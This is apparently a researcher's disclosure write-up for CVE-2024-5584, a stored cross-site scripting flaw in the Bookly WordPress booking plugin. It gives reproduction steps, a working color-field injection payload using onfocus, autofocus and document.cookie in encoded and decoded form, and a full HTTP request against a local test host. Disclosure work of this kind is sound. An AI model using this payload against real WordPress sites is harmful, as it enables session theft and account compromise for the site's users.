import { ArticleLayout } from '@/components/ArticleLayout'
import Image1 from './Pasted image 20240522013246.png'
import Image2 from './Pasted image 20240522013329.png'
import Image3 from './Pasted image 20240522013831.png'
import Image4 from './Pasted image 20240522014150.png'

export const article = {
  author: 'Daniel',
  date: '2024-07-10',
  title: 'WordPress Online Booking and Scheduling Plugin',
  description:
    'CVE-2024-5584',
}

export const metadata = {
  title: article.title,
  description: article.description,
}

export default (props) => <ArticleLayout article={article} {...props} />

### Plugin: WordPress Online Booking and Scheduling Plugin – Bookly

- **Version:** 23.2
- **Author:** [Nota-Info](https://www.booking-wp-plugin.com/?utm_source=bookly_admin&utm_medium=plugins_page&utm_campaign=plugins_page)
- **Last Updated:** 1 month ago
- **Requires WordPress Version:** 3.7 or higher
- **Compatible up to:** 6.5.3
- **Requires PHP Version:** 5.3.7 or higher
- **Active Installations:** 70,000+

https://wordpress.org/plugins/bookly-responsive-appointment-booking-tool/


### Description

The Bookly plugin for WordPress is vulnerable to Stored Cross-Site Scripting in versions up to, and including, 23.2 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers, with subscriber-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.

**CVSS Vector**[CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N)

## Reproduction

### Adding a staff account

URI: /wp-admin/admin.php?page=bookly-staff
I've added an account with my wp user with subscriber privileges.

<Image src={Image1} alt="" />

The colour picker displays the payload however manipulating the request in Burpsuite is recommended, I imagine some DOM based sanitization occurs through the picker.
<Image src={Image2} alt="" />

### Edit the profile and intercept the request with Burpsuite

<Image src={Image3} alt="" />

### Using autofocus to execute Javascript on page load.

Quite a few event payloads work such as "onhover", "mouseover" etc. Autofocus in combination with onfocus proved to be the most reliable.  

Payload: 
```
%7B%22full%5Fname%22%3A%220xSubscriber%200xSubscriber%22%2C%22email%22%3A%220xbishop%2001%40proton%2Eme%22%2C%22info%22%3A%22%7Bstaff%5Finfo%7D%22%2C%22color%22%3A%22pink%3B%5C%22%20onfocus%3D%27javascript%3Aalert%28document%2Ecookie%29%27%20autofocus%20id%3Dx%20tabindex%3D2%27%22%2C%22visibility%22%3A%22public%22%2C%22id%22%3A%221%22%2C%22attachment%5Fid%22%3A%22%22%2C%22phone%22%3A%22%22%7D
```

Decoded:
```
{"full_name":"0xSubscriber 0xSubscriber","email":"0xbishop 01@proton.me","info":"{staff_info}","color":"pink;\" onfocus='javascript:alert(document.cookie)' autofocus id=x tabindex=2'","visibility":"public","id":"1","attachment_id":"","phone":""}
```
### Payload successfully executes for other users


<Image src={Image4} alt="" />


### Appendix

Text Request for easy replication


``` 
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: 127.0.0.1:1337
Content-Length: 399
sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1:1337
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:1337/wp-admin/admin.php?page=bookly-staff
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: wordpress_32f00fe45378e26b2fea13815ec4c1b0=0xSubscriber%7C1716471661%7Cw7JeytpHOj2S9olGwrA3fK86rZLzHGZNcIKan2QrArX%7C9e62b007202046359282eb87745216e17f9a18392b74d1abecc2825ef928a4ee; bookly_cal_view=timeGridDay; wp-settings-3=uploader%3D1; wp-settings-time-3=1711260343; PHPSESSID=a3e822af0b833054983410ec8889c0ee; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_32f00fe45378e26b2fea13815ec4c1b0=0xSubscriber%7C1716471661%7Cw7JeytpHOj2S9olGwrA3fK86rZLzHGZNcIKan2QrArX%7C4e3349f52f4808046edb3967f96ade82d9044a5783c4fab007d2190aaf017f45; wp-settings-time-2=1716298919
Connection: close

action=bookly_update_staff&csrf_token=3623d338db&json_data=%7B%22full%5Fname%22%3A%220xSubscriber%200xSubscriber%22%2C%22email%22%3A%220xbishop%2001%40proton%2Eme%22%2C%22info%22%3A%22%7Bstaff%5Finfo%7D%22%2C%22color%22%3A%22pink%3B%5C%22%20onclick%3D%27javascript%3Aalert%281%29%27%22%2C%22visibility%22%3A%22public%22%2C%22id%22%3A%221%22%2C%22attachment%5Fid%22%3A%22%22%2C%22phone%22%3A%22%22%7D
```

Text Response

``` json
HTTP/1.1 200 OK
Date: Tue, 21 May 2024 14:45:03 GMT
Server: Apache/2.4.57 (Debian)
X-Powered-By: PHP/8.2.18
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0, no-store, private
Pragma: no-cache
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
X-Frame-Options: SAMEORIGIN
Content-Length: 598
Connection: close
Content-Type: application/json; charset=UTF-8

{"success":true,"data":{"staff":{"id":"1","wp_user_id":"2","category_id":null,"attachment_id":null,"full_name":"0xSubscriber 0xSubscriber","email":"0xbishop 01@proton.me","phone":null,"info":"{staff_info}","working_time_limit":null,"visibility":"public","position":"1","google_data":null,"outlook_data":null,"time_zone":null,"zoom_authentication":"default","zoom_oauth_token":null,"icalendar":"0","icalendar_token":"0f5524d6a688977dcb0446a303a5d99f","icalendar_days_before":"365","icalendar_days_after":"365","color":"pink;\" onclick='javascript:alert(1)'","gateways":null,"cloud_msc_token":null}}}
```

